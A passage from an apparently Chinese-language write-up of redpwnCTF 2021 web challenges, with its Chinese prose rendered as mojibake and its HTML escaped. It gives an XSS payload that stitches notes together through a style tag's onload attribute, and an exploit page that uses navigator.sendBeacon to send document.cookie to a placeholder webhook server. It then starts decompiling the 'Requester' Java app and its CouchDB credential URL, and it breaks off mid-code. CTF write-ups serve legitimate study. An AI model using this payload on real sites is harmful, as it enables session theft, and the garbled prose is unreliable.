&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093711969.png" alt="image-20210806093711969">&lt;/p>
&lt;p>æˆ‘ä»¬åˆ©ç”¨çš„å°±æ˜¯æµè§ˆå™¨è§£æhtmlçš„éƒ¨åˆ†ï¼Œå¯ä»¥è®©ä¸ç›¸å…³çš„å‡ ä¸ªnotesæ‹¼æ¥åœ¨ä¸€èµ·ï¼ˆä¸¾ä¸ªç®€å•çš„æ —å­ï¼šåœ¨ä¸€ä¸ªnoteé‡Œé¢ç”¨&lt;code>&amp;lt;p&amp;gt;&lt;/code> å¦ä¸€ä¸ªé‡Œé¢æ”¾&lt;code>&amp;lt;/p&amp;gt;&lt;/code>ï¼Œä¸­é—´çš„éƒ¨åˆ†ä¼šè¢«æ”¾åœ¨ä¸€èµ·ï¼‰è¿™é‡Œé€‰ç”¨çš„æ˜¯&lt;code>&amp;lt;style&amp;gt;&lt;/code>è¿™ä¸ªtagï¼Œåˆ©ç”¨å®ƒonloadçš„å±æ€§&lt;/p>
&lt;p>è¿˜æœ‰ä¸€ä¸ªå¾…è§£å†³çš„é—®é¢˜æ˜¯ä¸Šä¸‹ä¸¤ä¸ªnotesä¹‹é—´ä¼šæœ‰&lt;code>&amp;lt;div class=&amp;quot;card&amp;quot;&amp;gt;&lt;/code>çš„å­˜åœ¨ï¼›è¿™ä¹Ÿæ˜¯ä¸ç”¨&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>å’Œå®ƒçš„onloadå±æ€§çš„åŸå› ï¼Œå› ä¸ºæµè§ˆå™¨æ˜¯ä¸å…è®¸&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>ä¸­å±æ€§æ¢è¡Œçš„&lt;/p>
&lt;p>æˆ‘ä»¬æœ€ç»ˆçš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>body: anything
tag: &amp;lt;style a='
body: anything
tag: 'onload='`
body: `;eval(somecode)/*
tag: */'&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ç„¶åæ˜¯å¸¸è§„çš„xss&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://notes.mc.ax/view/&amp;lt;username&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;navigator.sendBeacon(&amp;#39;&amp;lt;webhook server&amp;gt;&amp;#39;, document.cookie)&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webrequester">web/Requester&lt;/h2>
&lt;blockquote>
&lt;p>Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021&lt;/p>
&lt;p>&lt;a href="https://requester.mc.ax/">requester.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/d92499fb296055bd3767e8d5c707605ca56a00517726fa281fa35dfda611fdee/requester-release.zip">requester-release.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>javaå¯ä»¥è¯´æ˜¯å®Œå…¨ä¸æ‡‚ï¼Œæ¯”èµ›çš„æ—¶å€™å°±ç®€å•çœ‹äº†ä¸‹å°±æºœäº†ï¼Œå‚è€ƒ &lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/">è§£æ³•1 - _replicator&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester">è§£æ³•2 - _find&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806100214553.png" alt="image-20210806100214553">&lt;/p>
&lt;p>ä¸€ä¸ªç®€å•çš„java-appï¼Œæ£€æµ‹ç»™å‡ºçš„apiæ˜¯å¦æ­£å¸¸ å¹¶ä¸”è¿”å›ä¸€ä¸ªjson&lt;/p>
&lt;p>ç»™äº†docker&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710160029981.png" alt="image-20210710160029981">&lt;/p>
&lt;p>å…ˆç”¨jd-guiæ‰“å¼€jaråŒ…çœ‹çœ‹æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716211333162.png" alt="image-20210716211333162">&lt;/p>
&lt;p>å…ˆçœ‹Main.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Database&lt;/span> &lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminPassword&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">javalinEnv&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javalinEnv&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adminUser&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">JavalinJte&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">createTemplateEngine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javalinEnv&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">Javalin&lt;/span> &lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Javalin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">8080&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.jte&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/createUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">createUser&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/testAPI&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">testAPI&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åšä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œå–å‡ºadminçš„ç”¨æˆ·åå’Œå¯†ç ä»¥åŠflagçš„å€¼ï¼Œæ–°å»ºä¸€ä¸ªdatabaseï¼Œåˆ†å‡º3ä¸ªè·¯ç”±ï¼›&lt;/p>
&lt;p>å…ˆçœ‹database.classï¼ˆåˆ†æçš„æ¯”è¾ƒè¯¦ç»† ä¹‹å‰åšjavaå¾ˆå°‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;@couchdb:5984/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">matches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;^[a-zA-Z0-9_]*$&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å­˜å‚¨ä»main.classé‡Œæ¥æ”¶åˆ°çš„adminUsername&amp;amp;adminPasswordï¼›&lt;code>getDbString()&lt;/code>è¿”å›ä¸€ä¸ªå¯ä»¥ç”¨æ¥è¿æ¥couchdbæ•°æ®åº“çš„url&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Database creation failed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_replicator&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Replicator already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_users&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Users already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Log already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>é€šè¿‡å‘æ„é€ å¥½çš„urlå‘é€httpè¯·æ±‚æ¥åˆ›å»ºæ•°æ®åº“ï¼Œæœ‰ä¸‰ä¸ªé»˜è®¤çš„åº“ï¼š_replicator, _users, log&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal password&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;_users/org.couchdb.user:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">userObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal dbname&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
